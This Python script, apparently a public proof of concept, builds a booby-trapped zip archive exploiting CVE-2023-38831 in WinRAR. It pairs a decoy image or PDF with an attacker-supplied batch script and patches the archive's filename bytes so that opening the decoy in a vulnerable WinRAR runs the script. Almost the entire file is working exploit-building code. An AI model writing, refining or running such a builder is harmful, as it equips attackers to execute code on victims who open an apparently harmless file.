import argparse
import os
import shutil
import sys

# -------------------------------------------------------------------------------------------------

def printBanner():
    columns = 70

    title   = '* CVE-2023-38831 Zero-Day Vulnerability in WinRAR - PoC *'
    version = 'Version: 1.0'
    author  = 'Author:  ZeroSword'

    print()
    print('='*columns)
    print('|' + ' '*(columns-2) + '|')
    print('|' + ' '*(columns-2) + '|')
    print('|     ' + title + ' '*(columns-2-5-len(title)) + '|')
    print('|' + ' '*(columns-2) + '|')
    print('|     ' + author + ' '*(columns-2-5-len(author)) + '|')
    print('|     ' + version + ' '*(columns-2-5-len(version)) + '|')
    print('|' + ' '*(columns-2) + '|')
    print('|' + ' '*(columns-2) + '|')
    print('='*columns)
    print('\n')

# -------------------------------------------------------------------------------------------------

# Just print the Banner
printBanner()

# Create the argument parser
parser = argparse.ArgumentParser(description='CVE-2023-38831 Zero-Day Vulnerability in WinRAR - PoC')

# Define the arguments
parser.add_argument('scriptPath',   help='The Filepath of the Malicious script/batch which will be executed')
parser.add_argument('benignPath',   help='The Filepath of the Benign file (recommended in \'.jpg\', \'.png\' and \'.pdf\')')
parser.add_argument('zipDirectory', help='The Name of the Directory which will be Created and Zipped')
parser.add_argument('fname',        help='The Names of the Folder and File in the Zip (including the file extension)')

# Parse the arguments
args = parser.parse_args()

# -------------------------------------------------------------------------------------------------


# Step 1: Check if the files specified in the arguments 'scriptPath' and 'benignPath' exists
if not os.path.exists(args.scriptPath):
    print(f'[-] Error: The file {args.scriptPath} does not exist !')
    sys.exit(1)
		
if not os.path.exists(args.benignPath):
	print(f'[-] Error: The file {args.scriptPath} does not exist !')
	sys.exit(1)


# Step 2: Delete (if existed) and create the directory with the name specified in the argument 'zipDirectory'
if os.path.exists(args.zipDirectory):
	shutil.rmtree(args.zipDirectory)
		
os.mkdir(args.zipDirectory)
print(f'[+] Created the directory \'{args.zipDirectory}\' !')


# Step 3: Create the directory 'fname + A'
scriptDirectory = os.path.join(args.zipDirectory, args.fname + 'A')
os.mkdir(scriptDirectory)
print(f'[+] Created the directory \'{scriptDirectory}\' !')


# Step 4: Copy and paste the script/payload & benign file to 'sample.pngA.bat' and 'sample.pngB' respectively,
#         suppose fname = 'sample.png'
destScriptPath = os.path.join(scriptDirectory, args.fname + 'A.bat')
destBenignPath = os.path.join(args.zipDirectory, args.fname + 'B')
shutil.copyfile(args.scriptPath, destScriptPath)
shutil.copyfile(args.benignPath, destBenignPath)
print(f'[+] Copied the file from \'{args.scriptPath}\' to \'{destScriptPath}\' !')
print(f'[+] Copied the file from \'{args.benignPath}\' to \'{destBenignPath}\' !')


# Step 5: Define the name archive file to be created, and create the archive
archive_name = 'poc'
shutil.make_archive(archive_name, 'zip', args.zipDirectory)


# Step 6: Replace the bytes in the zip with ' '
# Suppose args.fname = 'sample.png'
# sample.pngA.bat -> sample.png' '.bat 
# sample.pngB     -> sample.png' '     (Note: with a space at the end)
with open(archive_name + '.zip', 'rb') as z:
    zipBytes = z.read()
    zipBytes = zipBytes.replace(args.fname.encode() + b'A', args.fname.encode() + b' ')
    zipBytes = zipBytes.replace(args.fname.encode() + b'B', args.fname.encode() + b' ')
	
os.remove(archive_name + '.zip')

with open(archive_name + '.zip', 'wb') as z:
    z.write(zipBytes)
	
print(f'[+] Replaced the bytes in the Zip file !')
print(f'[+] Successfully Generated the PoC as \'{archive_name}\' !')
